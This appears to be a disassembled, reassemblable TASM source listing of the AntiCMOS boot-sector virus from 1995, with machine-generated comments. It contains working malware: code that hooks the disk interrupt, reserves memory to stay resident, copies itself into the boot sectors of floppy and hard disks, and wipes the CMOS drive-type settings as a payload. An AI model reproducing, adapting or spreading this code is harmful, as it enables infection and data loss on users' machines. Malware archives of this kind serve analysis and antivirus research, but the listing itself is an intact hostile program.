
PAGE  59,132

;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ					                                 ÛÛ
;ÛÛ				ANTICMOS                                 ÛÛ
;ÛÛ					                                 ÛÛ
;ÛÛ      Created:   26-May-95		                                 ÛÛ
;ÛÛ      Code type: zero start		                                 ÛÛ
;ÛÛ      Passes:    9          Analysis	Options on: H                    ÛÛ
;ÛÛ					                                 ÛÛ
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

target		EQU   'T3'                      ; Target assembler: TASM-3.1

.386c


; The following equates show data references outside the range of the program.

DATA_1E		EQU	4CH
main_ram_size_	EQU	413H
timer_low_	EQU	46CH
DATA_3E		EQU	500H
DATA_4E		EQU	7C00H			;*
DATA_5E		EQU	7C07H			;*
DATA_6E		EQU	7C09H			;*
DATA_14E	EQU	20BH			;*
DATA_15E	EQU	21EH			;*

SEG_A		SEGMENT	BYTE PUBLIC USE16
		ASSUME	CS:SEG_A, DS:SEG_A


		ORG	0

ANTICMOS	PROC	FAR

START:
;         Simulation segment register change due to reset to default  DS now 8EB6
;         Simulation segment register change due to reset to default  ES now 8EB6
		JMP	SHORT LOC_3
		DB	90H
DATA_7		DB	4DH
		DB	 53H, 44H, 4FH
DATA_8		DW	3553H, 302EH
DATA_9		DB	0
		DB	 02H, 01H, 01H, 00H, 02H,0E0H
		DB	 00H, 40H, 0BH,0F0H, 09H, 00H
DATA_10		DB	12H
		DB	0, 2, 0, 0, 0
LOC_3:
		CLI				; Disable interrupts
		XOR	AX, AX			; Zero register
		MOV	DS, AX
;         Simulation segment register change due to instruction       DS now 0000
		MOV	SS, AX
		MOV	SP, 7C00H
		MOV	SI, SP
		STI				; Enable interrupts
		LES	AX, DWORD PTR DS:DATA_1E	; Load seg:offset ptr
;         Simulation segment register change due to instruction       ES now 0070
		MOV	DS:DATA_5E, AX
		MOV	DS:DATA_6E, ES
		MOV	AX, DS:main_ram_size_
		DEC	AX
		DEC	AX
		MOV	DS:main_ram_size_, AX
		MOV	CL, 6
		SHL	AX, CL			; Shift w/zeros fill
		MOV	ES, AX
;         Simulation segment register change due to instruction       ES now 9F40
		MOV	CX, 200H
		XOR	DI, DI			; Zero register
		CLD				; Clear direction
		REP	MOVSB			; Rep when cx >0 Mov [si] to es:[di]
		MOV	AX, 88H
		PUSH	ES
		PUSH	AX
		RETF
;         Simulation segment register change due to reset to default  DS now 8EB6
;         Simulation segment register change due to reset to default  ES now 8EB6
			                        ;* No entry point to code
		PUSH	DS
		PUSH	AX
		TEST	DL, 0F0H
		JNZ	SHORT LOC_5		; Jump if not zero
		SHR	AH, 1			; Shift w/zeros fill
		DEC	AH
		JNZ	SHORT LOC_5		; Jump if not zero
		XOR	AX, AX			; Zero register
		MOV	DS, AX
;         Simulation segment register change due to instruction       DS now 0000
		MOV	AX, DS:timer_low_
		MOV	AL, AH
		SUB	AL, CS:DATA_7
		CMP	AL, 2
		JB	SHORT LOC_5		; Jump if below
		MOV	CS:DATA_7, AH
		CMP	AX, 2
		JAE	SHORT LOC_4		; Jump if above or =
		CALL	SUB_1
LOC_4:
		CALL	SUB_2
LOC_5:
;         Simulation segment register change due to return from sub   DS now 8EB6
		POP	AX
		POP	DS
		JMP	DWORD PTR CS:DATA_8
LOC_6:
		XOR	AX, AX			; Zero register
		MOV	ES, AX
;         Simulation segment register change due to instruction       ES now 0000
		INT	13H			; Disk  dl=drive a  ah=func 00h
						;  reset disk, al=return status
		PUSH	CS
LOC_7:
		POP	DS
		CMP	DATA_9, 0
		JE	SHORT LOC_8		; Jump if equal
		MOV	SI, OFFSET DATA_13	; (' key when ready')
		ADD	SI, 10H
		CMP	BYTE PTR [SI], 80H
		JNE	LOC_7			; Jump if not equal
		MOV	DX, [SI]
		MOV	CX, [SI+2]
		MOV	BX, DATA_4E
		MOV	AX, 201H
		INT	13H			; Disk  dl=drive ?  ah=func 02h
						;  read sectors to memory es:bx
						;   al=#,ch=cyl,cl=sectr,dh=head
		JC	LOC_6			; Jump if carry Set
		MOV	WORD PTR CS:[148H], 7C0H
		JMP	SHORT LOC_12
		DB	90H
LOC_8:
		MOV	DL, 80H
		CALL	SUB_2
		MOV	DI, OFFSET DATA_10
		MOV	AX, [DI-7]
		MOV	CX, 4
		SHR	AX, CL			; Shift w/zeros fill
		MOV	BP, AX
		MOV	AX, [DI-2]
		SHL	AX, 1			; Shift w/zeros fill
		INC	AX
		ADD	BP, AX
		DIV	BYTE PTR [DI]		; al,ah rem = ax/data
		MOV	CL, AH
		INC	CL
		XOR	DX, DX			; Zero register
		MOV	DH, AL
		MOV	BX, DATA_3E
LOC_9:
		MOV	AX, 201H
		INT	13H			; Disk  dl=drive a  ah=func 02h
						;  read sectors to memory es:bx
						;   al=#,ch=cyl,cl=sectr,dh=head
		JC	LOC_9			; Jump if carry Set
		MOV	AX, BP
		MOV	SI, 34H
		MOV	BH, 7
		DIV	BYTE PTR [DI]		; al,ah rem = ax/data
		XOR	CX, CX			; Zero register
		XCHG	AH, CL
		SUB	SI, CX
		DIV	BYTE PTR [DI+2]		; al,ah rem = ax/data
		MOV	DX, AX
		XCHG	DL, CH
		MOV	AL, [DI]
		SUB	AL, CL
		INC	CL
LOC_10:
		MOV	AH, 2
		PUSH	AX
		INT	13H			; Disk  dl=drive a  ah=func 02h
						;  read sectors to memory es:bx
						;   al=#,ch=cyl,cl=sectr,dh=head
		POP	AX
		JC	LOC_10			; Jump if carry Set
		MOV	CL, 1
		ADD	BH, AL
		ADD	BH, AL
		MOV	AX, [DI]
		INC	DH
		CMP	DH, [DI+2]
		JB	SHORT LOC_11		; Jump if below
		MOV	DH, 0
		INC	CH
LOC_11:
		SUB	SI, AX
		JNC	LOC_10			; Jump if carry=0
		ADD	AX, SI
		MOV	AH, 2
		INT	13H			; Disk  dl=drive a  ah=func 02h
						;  read sectors to memory es:bx
						;   al=#,ch=cyl,cl=sectr,dh=head
		MOV	CH, [DI-3]
		MOV	BX, BP
		MOV	WORD PTR DS:[148H], 70H
LOC_12:
		XOR	AX, AX			; Zero register
		MOV	DATA_9, AL
		MOV	DS, AX
;         Simulation segment register change due to instruction       DS now 0000
		MOV	AL, 52H			; 'R'
		MOV	DS:DATA_1E, AX
		MOV	WORD PTR DS:DATA_1E+2, CS
;*		JMP	FAR PTR LOC_1		;*
		DB	0EAH
		DW	0, 7C0H			;  Fixup - byte match

ANTICMOS	ENDP

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

SUB_1		PROC	NEAR
;         Simulation segment register change due to sub entry point   ES now 8EB6
		PUSH	BX
		MOV	AL, 10H
		OUT	70H, AL			; port 70H, CMOS addr,bit7=NMI
						;  al = 10H, floppy drive type
		IN	AL, 71H			; port 71H, CMOS data
		ADD	AL, 20H			; ' '
		AND	AL, 33H			; '3'
		MOV	AH, AL
		MOV	AL, 10H
		OUT	70H, AL			; port 70H, CMOS addr,bit7=NMI
						;  al = 10H, floppy drive type
		MOV	AL, AH
		OUT	71H, AL			; port 71H, CMOS data
		MOV	AL, 12H
		OUT	70H, AL			; port 70H, CMOS addr,bit7=NMI
						;  al = 12H, hard disk type
		MOV	AL, 0
		OUT	71H, AL			; port 71H, CMOS data
		POP	BX
		RETN
SUB_1		ENDP


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

SUB_2		PROC	NEAR
		PUSH	BX
		PUSH	CX
		PUSH	DX
		PUSH	ES
		PUSH	SI
		PUSH	DI
		PUSH	CS
		POP	DS
;         Simulation segment register change due to instruction       DS now 8EB6
		PUSH	CS
		POP	ES
		MOV	BX, 200H
		MOV	CX, 1
		XOR	DH, DH			; Zero register
		MOV	AX, 201H
		PUSHF				; Push flags
		CALL	DWORD PTR DATA_8
		JC	SHORT LOC_14		; Jump if carry Set
		MOV	WORD PTR [BX], 1CEBH
		CMP	DL, 80H
		JNE	SHORT LOC_13		; Jump if not equal
		MOV	DS:DATA_14E, DL
LOC_13:
		CLD				; Clear direction
		MOV	CX, 1A0H
		MOV	SI, 1EH
		MOV	DI, DATA_15E
		REP	MOVSB			; Rep when cx >0 Mov [si] to es:[di]
		MOV	AX, 301H
		INC	CX
		PUSHF				; Push flags
		CALL	DWORD PTR DATA_8
LOC_14:
		POP	DI
		POP	SI
		POP	ES
;         Simulation segment register change due to instruction       ES now 0000
		POP	DX
		POP	CX
		POP	BX
		RETN
SUB_2		ENDP

;         Simulation segment register change due to reset to default  ES now 8EB6
DATA_13		DB	' key when ready', 0DH, 0AH, 'Rep'
		DB	'lace and press any key when read'
		DB	'y', 0DH, 0AH, 0
		DB	'IO      SYSMSDOS   SYS'
		DB	 00H, 00H, 55H,0AAH

SEG_A		ENDS



		END	START
